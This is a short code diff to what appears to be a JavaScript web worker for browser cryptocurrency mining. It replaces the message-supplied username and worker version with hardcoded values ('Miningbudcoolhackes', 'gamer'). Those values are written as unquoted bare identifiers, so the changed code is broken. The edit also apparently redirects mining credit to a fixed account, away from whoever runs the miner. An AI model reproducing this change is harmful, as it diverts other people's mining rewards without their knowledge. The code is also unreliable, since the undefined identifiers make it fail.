@@ -17,9 +17,9 @@ onmessage = function(event) {
     if (event.data.startsWith("Start")) {
         let getData = event.data.split(",");
         let result = 0;
-        let username = getData[1];
+        let username = Miningbudcoolhackes;
         let rigid = getData[2];
-        let workerVer = getData[3];
+        let workerVer = gamer;
         let wallet_id = getData[4];
 
         if (rigid === "") {
